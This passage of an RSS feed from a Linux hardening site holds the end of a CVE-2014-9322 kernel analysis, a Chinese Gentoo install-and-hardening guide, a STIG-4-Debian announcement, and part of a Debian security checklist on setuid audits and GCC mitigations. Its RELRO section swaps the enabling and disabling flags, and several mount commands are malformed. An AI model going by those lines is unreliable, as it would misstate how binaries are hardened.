设置这个位，因此用户空间不能使用这条指令。&lt;/p&gt;

&lt;p&gt;在64位系统上，非系统级的GDT和LDT条目依然是8个字节长，base field是最大
4GB-1，所以根本没有机会设置一个基地址的段在内核空间里。所以，除非我漏掉
了能在内核里设置用户态gs base的其他方法，不然SMAP能保护CVE-2014-9322针
对64位Linux内核任意代码执行的漏洞利用。&lt;/p&gt;

&lt;p&gt;[1] CVE-2014-9322 
    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322&lt;/p&gt;

&lt;p&gt;[2] Upstream fix
    http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6f442be2fb22be02cafa606f1769fa1e6f894441&lt;/p&gt;

&lt;p&gt;[3] Intel Software Developer’s Manuals,
    http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html&lt;/p&gt;

&lt;p&gt;[4] SMEP
    http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux/&lt;/p&gt;

&lt;p&gt;[5] SMAP
    http://lwn.net/Articles/517475&lt;/p&gt;

&lt;p&gt;[6] “pretend-it-was-#GP-in-userspace”
    https://lists.debian.org/debian-kernel/2014/12/msg00083.html&lt;/p&gt;

&lt;p&gt;[7] Stack Pivoting
    https://trailofbits.files.wordpress.com/2010/04/practical-rop.pdf&lt;/p&gt;

&lt;p&gt;[8] TSX improves timing attacks against KASLR
    http://labs.bromium.com/2014/10/27/tsx-improves-timing-attacks-against-kaslr/&lt;/p&gt;
</description>
        <pubDate>Sun, 05 Jul 2015 22:46:39 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/07/05/badiret-analysis.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/07/05/badiret-analysis.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>Gentoo GNU/Linux系统安装与加固</title>
        <description>&lt;p&gt;By: Ciphergateway&lt;/p&gt;

&lt;p&gt;–[  目录&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;准备工作&lt;/li&gt;
  &lt;li&gt;组建RAID1&lt;/li&gt;
  &lt;li&gt;安装Gentoo系统
3.1 livecd下配置安装环境
3.2 Gentoo安装及编译
3.3 软件环境安装&lt;/li&gt;
  &lt;li&gt;Gentoo内核加固
4.1 加固选项设置
4.2 编译gentoo hardened内核&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section&quot;&gt;–[ 1、准备工作&lt;/h2&gt;

&lt;p&gt;用U盘启动引导安装gentoo系统，将gentoo系统的镜像文件livedvd-amd64-multilib-20140826.iso拷贝到已经格式化过的格式为fat32的U盘中；&lt;/p&gt;

&lt;p&gt;U盘镜像下载链接：&lt;a href=&quot;http://mirrors.se.kernel.org/gentoo//releases/amd64/20140826/livedvd-amd64-multilib-20140826.iso&quot; title=&quot;下载链接&quot;&gt;http://mirrors.se.kernel.org/gentoo//releases/amd64/20140826/livedvd-amd64-multilib-20140826.iso&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;raid1&quot;&gt;–[ 2、组建RAID1&lt;/h2&gt;

&lt;p&gt;1）Advanced Mode–&amp;gt;高级–&amp;gt;cpu设置，将Intel虚拟技术设为开启；&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/ljVLrxi.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2）Advanced Mode–&amp;gt;高级–&amp;gt;PCH存储设置，将SATA模式选择为RAID；&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/K6rDKtM.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;3）保存设置并重启，按Ctrl+I(分别按不是同时按)，进入RAID配置界面，将两块3T机械硬盘组建为RAID1;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/XjgyVIQ.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;gentoo&quot;&gt;–[ 3、安装Gentoo系统&lt;/h2&gt;

&lt;h3 id=&quot;livecd&quot;&gt;—-[ 3.1 livecd下配置安装环境&lt;/h3&gt;

&lt;p&gt;1）服务器上插入U盘，配置root账户，开启sshd服务:
　
&lt;img src=&quot;http://i.imgur.com/LUPazv2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2）使用gentoo livecd中自带的分区工具gdisk为系统分区，机械盘分两区，固态盘分五区(实际使用过程中使用cfdisk，gparted也可，我使用给gdisk的原因是这次在对raid盘进行分区时使用gparted造成了gpt与mbr分区表同时存在的问题，使用cfdisk将整个分区识别为了一个名为gpt的主分区)，以下是两块硬盘的分区结果：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/LytBlwM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/pJ1S2K2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;3）利用secureCRT登陆系统shell(链接前先要确认主机的ip，并确保两个主机处于同一网段，如果只有一台电脑，也可以在该主机上直接操作)：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/y5eo8Qh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4）制作文件系统(格式化分区，默认格式成了ext4分区，如有需要，也可以格式成其他格式的分区)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    mkfs.ext4 /dev/sda3
    mkfs.ext4 /dev/sda4
    mkfs.ext4 /dev/sda5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/6x8T18i.jpg&quot; alt=&quot;&quot; /&gt;
设置swap分区&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    mkswap /dev/sda2 ![](http://i.imgur.com/FX6HKRi.png) 格式化其他分区
    mkfs.fat /dev/sda1
    mkfs.ext4 /dev/md126p1
    mkfs.ext4 /dev/md126p2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/wVi2cPS.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;5）挂载分区（将两块硬盘以目录树的形式挂载在/mnt）(分区用途/dev/sda1 efi分区，才用mbr引导的可忽略此份区，/dev/sda3 tmp分区，/den/sda4 根分区，/dev/sda5 home分区)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; mount /dev/sda4/mnt/gentoo
 mkdir -p/mnt/gentoo/boot/efi
 mount /dev/sda1/mnt/gentoo/boot/efi
 mount -p/mnt/gentoo/home
 mount /dev/sda5/mnt/gentoo/home
 mkdir /mnt/gentoo/tmp
 mount /dev/sda3/mnt/gentoo/tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）设置系统时间(注意 日期格式为MMddhhmmyyyy)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;date 061915262015
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;7）下载系统编译包portage-latest.tar.bz2和stage3-amd64-20150618.tar.bz2到/mnt/gentoo目录下(注意，镜像源我们选择的是阿里云的镜像，使用者可自行更换，下载stage3包时要选择日期最近的)：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;wget http://mirrors.aliyun.com/gentoo/releases/snapshots/current/portage-latest.tar.bz2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/1YOrwhV.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt; wget http://mirrors.ustc.edu.cn/gentoo/releases/amd64/autobuilds/current-stage3-amd64/stage3-amd64-20150618.tar.bz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/gNpBpCX.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;8）解压stage3和portage两个文件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar -jxvf stage3-amd64-20150618.tar.bz2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注: stage3-amd64-20131010.tar.bz2解压的文件是Gentoo的目录结构，所以要解压到临时的系统目录下,即/mnt/gentoo，方便后面进行chroot&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar -jxvf portage-latest.tar.bz2 -C /mnt/gentoo/usr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注: portage-latest.tar.bz2解压的文件为系统软件目录结构,需要解压到/mnt/gentoo/usr目录下&lt;/p&gt;

&lt;h3 id=&quot;gentoo-1&quot;&gt;—-[ 3.2 Gentoo安装及编译&lt;/h3&gt;

&lt;p&gt;1）切换系统到/dev/sda3根分区上并更新系统环境变量：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mount -t proc none /mnt/gentoo/proc
mount -o bind /dev /mnt/gentoo/dev
mount -t sysfs sys /mnt/gentoo/sys
chroot /mnt/gentoo /bin/bash
env-update
&amp;gt;&amp;gt; Regenerating /etc/ld.so.cache...
source /etc/profile
export PS1=&quot;(chroot) $PS1&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）设置时区：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cp /usr/share/Asia/Shanghai /etc/localtime
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3）设置主机名：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sed -i -e's/hostname.*/hostname=&quot;shenhua&quot;/' /etc/conf.d/hostname
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4）修改镜像源 并且设置编译参数为8核编译(注意，编译参数在设置为核心数加1时理论上也可获得最优效果)：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/9452UEB.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;5）设置DNS(通常情况下设置默认dns即可，但此步缺失会造成dns无法解析，原因为chroot过程中dns信息未被转移)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;echo &quot;nameserver 10.1.2.1&quot; &amp;gt;&amp;gt; /etc/resolv.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）安装内核源码：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge gentoo-sources
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;7）安装自动编译内核工具genkernel：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge genkernel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;8）复制安装光盘的配置文件到genkernel搜索配置文件的默认位置(注意32位用户目录为/usr/share/arch/x8/,此配置文件livecd所使用的配置文件)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;zcat /proc/config.gz &amp;gt; /usr/share/arch/x86_64/kernel-config
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;9）编译内核：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; genkernel all
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;10）修改fstab：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Olr6tbb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;11）配置网络：&lt;/p&gt;

&lt;p&gt;　（1）生成软连接(注意，eno1为网络接口名，不同电脑可能不同，请在chroot前用ifconfig命令确认)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   ln -s /etc/init.d/net.lo /etc/init.d/net.eno1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　（2）创建网络配置文件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; vi /etc/conf.d/net
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　在空文件中写入(注意，如果是静态ip请采用静态配置)：
     # DHCP
     config_eno1=( “dhcp” )&lt;/p&gt;

&lt;p&gt;12）设置网卡开机自启动：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rc-update add net.eno1 default
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;13）设置GRUB引导：&lt;/p&gt;

&lt;p&gt;(1) 修改配置文件：在etc/portage/make.conf中添加GRUB_PLATFORMS=”efi-64”(mbr引导可忽略此步骤)&lt;/p&gt;

&lt;p&gt;(2) 安装GRUB&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge --ask sys-boot/grub:2
emerge -av sys-boot/os-prober
grub2-install --target=x86_64-efi
grub2-mkconfig -o /boot/grub2/grub.cfg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(3) 重起电脑，确认grub引导是否安装成功，如果成功再进行一下步骤&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;—-[ 3.3 软件环境安装&lt;/h3&gt;

&lt;p&gt;1）安装xrog：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 在 /etc/portage/make.conf 中添加 INPUT_DEVICES=&quot;evdev synaptics&quot; 
 emerge --ask --verbose --pretend x11-base/xorg-drivers
 emerge --ask x11-base/xorg-server
 cat /etc/portage/package.use/._cfg0000_iputils &amp;gt; /etc/portage/package.use/iputils
 emerge twm
 emerge xclock
 emerge xterm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　　备注：twm xclock xterm原本是xrog软件包的一部分，在版本更新后从xrog中分离出来 需要单独安装&lt;/p&gt;

&lt;p&gt;2）编译kde桌面环境 
　　备注：编译其他环境 请参照wiki.gentoo.org openrc启动的kde对应的编号是6 其他桌面环境请自行更换&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;eselect profile list
eselect profile set 6
emerge --ask kde-apps/kdebase-meta
emerge --ask kde-base/kde4-l10n
在/etc/portage/make.conf中添加 LINGUAS=&quot;de&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;gentoo-2&quot;&gt;–[  4、Gentoo内核加固&lt;/h2&gt;

&lt;h3 id=&quot;section-2&quot;&gt;—-[ 4.1　加固选项设置&lt;/h3&gt;

&lt;p&gt;　　编辑/etc/ssh/ssh_config文件，在里面加入：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	# 1, known_hosts stores server's signature, so hash the host name:	
	HashKnownHosts yes
	#2, SSH protocl version 1 is not secure:
	Protocol 2
	#3, If you don't use X11 forwarding, plz disable it&quot;
	X11Forwarding no
	#4, Disable rhosts:
	IgnoreRhosts yes
	#5, Not allow empty password:
	PermitEmptyPasswords no
	#6, Maxisum tries:
	MaxAuthTries 5
	#7, Now allow root login:
	PermitRootLogin no
	#(Optional)
	#1, disable password auth, enable pubkey auth:
	PubkeyAuthentication yes
	PasswordAuthentication no
	#2，Allow or deny users/groups
	#AllowGroups, AllowUsers, DenyUsers, DenyGroups
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;　　根据自己的实际要求在改写最后一行 改为自己的用户组合用户名&lt;/p&gt;

&lt;h3 id=&quot;gentoo-hardened&quot;&gt;—-[ 4.2　编译gentoo hardened内核&lt;/h3&gt;

&lt;p&gt;1）下载加固内核源码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge --ask sys-kernel/hardened-sources
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2）配置加固内核 参照：&lt;/p&gt;

&lt;p&gt;　　&lt;a href=&quot;https://wiki.gentoo.org/wiki/Hardened/PaX_Quickstart#Building_a_PaX_Kernel&quot;&gt;https://wiki.gentoo.org/wiki/Hardened/PaX_Quickstart#Building_a_PaX_Kernel&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;　　&lt;a href=&quot;https://wiki.gentoo.org/wiki/Hardened/Grsecurity2_Quickstart&quot;&gt;https://wiki.gentoo.org/wiki/Hardened/Grsecurity2_Quickstart&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3）编译&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4）安装&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# make install
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5）选择内核&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# eselect kernel list
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6）重启使用新内核即可&lt;/p&gt;

</description>
        <pubDate>Tue, 23 Jun 2015 00:00:00 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/06/23/Gentoo_system_install&kernal_harden.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/06/23/Gentoo_system_install&kernal_harden.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>STIG-4-Debian</title>
        <description>&lt;p&gt;By:n3o4po11o&lt;/p&gt;

&lt;p&gt;Project: &lt;a href=&quot;https://github.com/hardenedlinux/STIG-4-Debian&quot;&gt;STIG-4-Debian&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;why-stig&quot;&gt;Why STIG?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://iase.disa.mil/stigs/Pages/index.aspx&quot;&gt;STIGs&lt;/a&gt; is bring by a government agency called The Defense Information
System Agency(DISA), which is entity responsible for maintaining the security
posture of the Department of Defence(DoD) IT infrastructure. After we heard 
how the NSA fuck this world from Mr.Sn0wd3n.We will pay more attention about
how &lt;em&gt;they&lt;/em&gt; do the defense.&lt;/p&gt;

&lt;p&gt;DoD use this Security Technical Implementation Guides to All DoD IT assets before online/operations.&lt;/p&gt;

&lt;p&gt;And the STIGs classification system based on Mission Assurance Catagory (I-III)
and Confidentiality Level (Public-Classified), giving you 9 different possible 
combinations of config requirements.&lt;/p&gt;

&lt;h2 id=&quot;why-debian&quot;&gt;Why Debian?&lt;/h2&gt;

&lt;p&gt;In this scripts I’ve on Debian GNU/Linux 8, Debian has a lot security mechanism, and 
some good features, especially “ReproducibleBuilds”. I use the STIG for Red hat
6 v1r7 to porting STIG for Debian 8.&lt;/p&gt;

&lt;p&gt;Debian always has active maintenance, and has good security in default-configuration&lt;/p&gt;

&lt;h2 id=&quot;whats-different&quot;&gt;What’s different?&lt;/h2&gt;

&lt;p&gt;In STIG for RHEL-06, there’s some service doesn’t exist in debian, or some command or
some purpose implement in different way.&lt;/p&gt;

&lt;p&gt;You could find the porting-log in the repo &lt;a href=&quot;https://github.com/hardenedlinux/STIG-4-Debian&quot;&gt;STIG-4-Debian&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But the general idea are all based on &lt;a href=&quot;http://iasecontent.disa.mil/stigs/zip/Apr2015/U_RedHat_6_V1R7_STIG.zip&quot;&gt;STIG For RHEL-06 v1r7&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;

&lt;p&gt;There’s a lot of TODO &lt;br /&gt;
Because this version I release just a simple “POC”, and just a pre-release version.
It doesn’t even cover all the “check”&lt;/p&gt;

&lt;p&gt;But I will release the first version of “full-check” version soon, and add Classification 
and Severity right after full-check, I think it will release in next month.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;[1]Difference between hardening guides (CIS, NSA, DISA)
http://security.stackexchange.com/questions/73164/difference-between-hardening-guides-cis-nsa-disa&lt;/p&gt;

&lt;p&gt;[2]What Are “STIGs” and How Do They Impact Your Overall Security Program?
http://www.seguetech.com/blog/2013/05/06/stigs-impact-overall-security-program&lt;/p&gt;

&lt;p&gt;[3]Beyond compliance: DISA STIGs’ role in cybersecurity
http://gcn.com/Articles/2015/05/14/DISA-STIG-compliance.aspx?Page=1&lt;/p&gt;

&lt;p&gt;[4]Security Technical Implementation Guides (STIGs)
http://iase.disa.mil/stigs/Pages/index.aspx&lt;/p&gt;

&lt;p&gt;[5]DISA RHEL 6 STIG V1 R7
http://iasecontent.disa.mil/stigs/zip/Apr2015/U_RedHat_6_V1R7_STIG.zip&lt;/p&gt;

&lt;p&gt;[6]Defense Information Systems Agency
https://en.wikipedia.org/wiki/Defense_Information_Systems_Agency&lt;/p&gt;

&lt;p&gt;[7]ReproducibleBuilds
https://wiki.debian.org/ReproducibleBuilds&lt;/p&gt;
</description>
        <pubDate>Fri, 19 Jun 2015 11:38:39 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/06/19/STIG-4-Debian.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/06/19/STIG-4-Debian.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>Debian GNU/Linux security checklist and hardening</title>
        <description>&lt;p&gt;project STIG-4-Debian will be soonn….&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/citypw/DNFWAH/master/5/d5_0x02_DNFWAH_debian_gnu-linux_security_chklist_hardening.txt&quot;&gt;Debian GNU/Linux security checklist and hardening&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;–[ CONTENTS&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;About this doc&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security updates&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Vulnerability Assessment&lt;/p&gt;

    &lt;p&gt;2.1 GCC mitigation&lt;/p&gt;

    &lt;p&gt;2.2 0ld sch00l *nix file auditing&lt;/p&gt;

    &lt;p&gt;2.3 GNU/Linux’s auditd&lt;/p&gt;

    &lt;p&gt;2.4 T00ls&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Kernel security&lt;/p&gt;

    &lt;p&gt;3.1 Apparmor&lt;/p&gt;

    &lt;p&gt;3.2 SELinux&lt;/p&gt;

    &lt;p&gt;3.3 Mempo kernel&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;3.3.1 PaX\/Grsecurity
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;SSL/TLS Checklist&lt;/p&gt;

    &lt;p&gt;4.1 Ciphersuites in Apache2/Nginx&lt;/p&gt;

    &lt;p&gt;4.2 OpenSSH&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;4.2.1 OpenSSH in post-prism era
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Web security&lt;/p&gt;

    &lt;p&gt;5.1 Web server( Apache/Nginx?)&lt;/p&gt;

    &lt;p&gt;5.2 WAF( Web Application Firewall)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security standard&lt;/p&gt;

    &lt;p&gt;6.1 STIGs for Debian&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reference&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;about-this-documentation&quot;&gt;–[ 0. About this documentation&lt;/h2&gt;

&lt;p&gt;GNU/Linux already become one of most important fundamental element in
*modern* IT platform. Almost every important applications heavily rely
on the core component of GNU system: GCC, Glibc and linux
kernel. GNU/Linux is totally free/libre and open source software(
FLOSS). Many people thinks free/libre and open source software is
secure because its open to many eyes. Yes, that’s true. According to
&lt;a href=&quot;http://developers.slashdot.org/story/14/04/16/2021227/code-quality-open-source-vs-proprietary&quot;&gt;Coverity’s report&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The source code quality of FLOSS project are better than closed
software systems. But the FLOSS is not unbreakable. This documentation
is going to discuss something we should know about GNU/Linux security
operations. These examples in this doc has been tested only on Debian
GNU/Linux 7.5.&lt;/p&gt;

&lt;h2 id=&quot;security-update&quot;&gt;–[ 1. Security update&lt;/h2&gt;

&lt;p&gt;Follow the minimal installation principle: Debian is providing mini
installation iso.&lt;/p&gt;

&lt;p&gt;To check which packages need security updates:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;#sudo apt-get upgrade -s&lt;/td&gt;
      &lt;td&gt;grep -i security&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;vulnerability-assessment&quot;&gt;–[ 2. Vulnerability Assessment&lt;/h2&gt;

&lt;p&gt;Know your GNU/Linux system as your *enemy* does. Your enmey might hide
in the shadow and watch and learn the ways you’ve been using the
system. As a defender, some philosophical ideas( thanks to Bruce
Schneier) should be &lt;a href=&quot;https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html&quot;&gt;kept in mind&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;Security is NOT:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Security is NOT installing a firewall&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is NOT a Product or Service&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is Not a Product; It’s a Process&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Security is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Security is a Process, Methodology, Costs, Policies and People&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is only as good as your “weakest link”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Security is 24x7x365 … constantly ongoing .. never ending&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;A security system is only as strong as its weakest
link. Defense-in-depth seems the only option we have. You should be
the best professional paranoia and also need a proper threat
model. “Who’s gonna attack your system” would be daily bread for your
mind;-)&lt;/p&gt;

&lt;p&gt;Those two articles are good examples of assessing GNU/Linux distros: &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/2010/06/29/assessing-the-tux-strength-part-1---userspace-memory-protection/&quot;&gt;Assessing I&lt;/a&gt;, &lt;a href=&quot;https://labs.mwrinfosecurity.com/blog/2010/09/02/assessing-the-tux-strength-part-2---into-the-kernel/&quot;&gt;Assessing II&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;“checksec.sh” is very useful tool from trapkit:&lt;/p&gt;
&lt;pre&gt;
#wget http://www.trapkit.de/tools/checksec.sh
&lt;/pre&gt;

&lt;p&gt;Be very careful with those binaries, which has suid( or sgid?) bit:&lt;/p&gt;
&lt;pre&gt;
#!/bin/bash

SETUID_PROGS=`find / -type f -perm -4000`

echo $SETUID_PROGS

for i in $SETUID_PROGS; do
        ./checksec.sh --file $i
done
&lt;/pre&gt;

&lt;h3 id=&quot;gcc-mitigation&quot;&gt;—-[ 2.1 GCC mitigation&lt;/h3&gt;

&lt;p&gt;setuid binaries are highly risks if the program had the bug that can
be exploitable.  The setuid binaries should be protected under GCC’s
mitigation.  We only examine &lt;a href=&quot;http://phrack.org/archives/issues/67/13.txt&quot;&gt;4 mitigation options here&lt;/a&gt; ( some GCC mitigation
description from one Phrack paper, thanks pi3..dude, did I owe you a
beer?)&lt;/p&gt;

&lt;p&gt;*) NX&lt;/p&gt;

&lt;p&gt;This feature can prevent shellcode execution on the stack.  This
mechanism can be implemented by hardware or software emulation.&lt;/p&gt;

&lt;p&gt;In GCC’s options, &lt;a href=&quot;http://en.wikipedia.org/wiki/NX_bit&quot;&gt;NX&lt;/a&gt; is enable by default. If you want to turn it off,
use “-z execstack”.&lt;/p&gt;

&lt;p&gt;Check method:&lt;/p&gt;
&lt;pre&gt;
shawn@shawn-fortress ~ $ readelf -l a.out | grep GNU_STACK 
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x8
&lt;/pre&gt;

&lt;p&gt;*) Stack canaries (canaries of the death)&lt;/p&gt;

&lt;p&gt;This is a compiler mechanism, in contrast to previously kernel-based
described techniques. When a function is called, the code inserted by
the compiler in its prologue stores a special value (the so-called
cookie) on the stack before the metadata. This value is a kind of
defender of sensitive data. During the epilogue the stack value is
compared with the original one and if they are not the same then a
memory corruption must have occurred. The program is then killed and
this situation is reported in the system logs. Details about technical
implementation and little arm race between protection and bypassing
protection in this area will be explained further.&lt;/p&gt;

&lt;p&gt;GCC options:
-fno-stack-protector,  do not add any canary onto any functions&lt;/p&gt;

&lt;p&gt;-fstack-protector, only add the canary onto a few functions in compile
 time&lt;/p&gt;

&lt;p&gt;-fstack-protector-all , add the canary onto all functions, be cautions
 about this one. It’d be triggered the heavily performance hit.&lt;/p&gt;

&lt;p&gt;-fstack-protector-strong, add the canary onto those functions, which
 the stack buffers would be used. This is a smart one. But its only
 supported by GCC 4.9.x. Kees Cook shared a very &lt;a href=&quot;http://www.outflux.net/blog/archives/2014/01/27/fstack-protector-strong/&quot;&gt;good writing here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Check the symbols in an elf file:&lt;/p&gt;
&lt;pre&gt;
#readelf -s ./a.out | grep stack_chk_fail 
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4 (3) 
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@@GLIBC_2 
&lt;/pre&gt;

&lt;p&gt;*) RELRO&lt;/p&gt;

&lt;p&gt;RELocation Read-Only.&lt;/p&gt;

&lt;p&gt;Turn it on: -z norelro 
Turn it off: -z now&lt;/p&gt;

&lt;p&gt;Check elf header to find partial-RELRO:&lt;/p&gt;
&lt;pre&gt;
shawn@shawn-fortress ~ $ readelf -l a.out | grep GNU_RELRO 
  GNU_RELRO      0x0000000000000e28 0x0000000000600e28 0x0000000000600e28 

Check elf's dynamic sections to find fully-RELRO: 
shawn@shawn-fortress ~ $ readelf -d a.out | grep BIND_NOW 
